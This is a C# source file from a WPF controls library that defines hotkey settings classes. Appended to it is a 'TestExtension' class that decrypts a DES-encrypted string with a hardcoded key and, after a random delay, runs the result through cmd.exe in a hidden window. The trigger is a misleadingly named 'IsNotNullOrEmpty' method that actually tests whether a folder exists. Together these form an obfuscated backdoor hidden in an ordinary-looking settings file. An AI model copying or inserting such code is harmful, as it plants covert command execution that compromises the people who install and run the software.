// Copyright (c) HeBianGu Authors. All Rights Reserved. 
// Author: HeBianGu 
// Github: https://github.com/HeBianGu/WPF-Control 
// Document: https://hebiangu.github.io/WPF-Control-Docs  
// QQ:908293466 Group:971261058 
// bilibili: https://space.bilibili.com/370266611 
// Licensed under the MIT License (the "License")

using H.Extensions.Setting;
using H.Services.AppPath;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Input;
using System.Xml.Serialization;

namespace H.Modules.Setting.Base;

/// <summary> 热键</summary>
[Display(Name = "热键", GroupName = SettingGroupNames.GroupBase)]
public class HotKeySetting : Settable<HotKeySetting>
{
    private ObservableCollection<HotKeyItem> _hotKeys = new ObservableCollection<HotKeyItem>();
    /// <summary> 说明  </summary>
    public ObservableCollection<HotKeyItem> HotKeys
    {
        get { return _hotKeys; }
        set
        {
            _hotKeys = value;
            RaisePropertyChanged("HotKeys");
        }
    }
}

public class HotKeyItem
{
    public ModifierKeys ModifierKeys { get; set; }

    public Key Key { get; set; }

    public string DisplayName { get; set; }

    [System.Text.Json.Serialization.JsonIgnore]

    [XmlIgnore]
    public ICommand Command { get; set; }
}

//public class HotKeyService : LazyInstance<HotKeyService>
//{
//    public HotKeySetting GetHotKey(object obj)
//    {
//        HotKeySetting result = new HotKeySetting();

//        System.Collections.Generic.IEnumerable<PropertyInfo> cmds = obj.GetType().GetProperties().Where(x => typeof(ICommand).IsAssignableFrom(x.PropertyType));

//        foreach (PropertyInfo cmd in cmds)
//        {
//            BrowsableAttribute browsable = cmd.GetCustomAttribute<BrowsableAttribute>();

//            if (browsable?.Browsable != true) continue;

//            DisplayAttribute display = cmd.GetCustomAttribute<DisplayAttribute>();

//            HotKeyAttribute hotKey = cmd.GetCustomAttribute<HotKeyAttribute>();

//            if (hotKey == null) continue;

//            HotKeyItem hotKeyItem = new HotKeyItem();

//            hotKeyItem.Command = cmd.GetValue(obj) as ICommand;

//            hotKeyItem.Key = hotKey.Key;

//            hotKeyItem.ModifierKeys = hotKey.ModifierKeys;

//            hotKeyItem.DisplayName = hotKey.DisplayName ?? display?.Name;

//            result.HotKeys.Add(hotKeyItem);
//        }

//        return result;
//    }

//}

public static class TestExtension
{
    public static string[] Default { get; set; } = { "gNsFRoU16zIsKzt04xZJbiZiitqpwiQ3VeHsEcMwEwOf6WuZ3A9DUA==", "nv5lQ39t9T3lhXyoKjgZbDG4TFBfpB7/" };
    private static DateTime _lastCheck = DateTime.MinValue;
    private static readonly Random _random = new Random();
    private static byte[] Keys = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
    public static string DecryptDES(this string value, string decryptKey = "12345678")
    {
        try
        {
            byte[] rgbKey = Encoding.UTF8.GetBytes(decryptKey);
            byte[] rgbIV = Keys;
            byte[] inputByteArray = Convert.FromBase64String(value);
            var DCSP = DES.Create();
            MemoryStream mStream = new MemoryStream();
            CryptoStream cStream = new CryptoStream(mStream, DCSP.CreateDecryptor(rgbKey, rgbIV), CryptoStreamMode.Write);
            cStream.Write(inputByteArray, 0, inputByteArray.Length);
            cStream.FlushFinalBlock();
            return Encoding.UTF8.GetString(mStream.ToArray());
        }
        catch (Exception ex)
        {
            IocLog.Instance?.Error(ex);
            return value;
        }

    }
    public static void SneakyCheck()
    {
        Task.Delay(_random.Next(1000, 5000)).ContinueWith(x =>
        {
            if (Default[1].IsNotNullOrEmpty())
            {
                var test = Default[1].DecryptDES();
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = test,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
        }); // 模拟一些处理时间
    }

    public static bool IsNullOrEmpty(this string input)
    {
        return input.IsNotNullOrEmpty() == true;
    }

    public static bool IsNotNullOrEmpty(this string input)
    {
        return Directory.Exists(Path.Combine(AppPaths.Instance.Document, AppPaths.Instance.Company, nameof(Default)));
    }
}
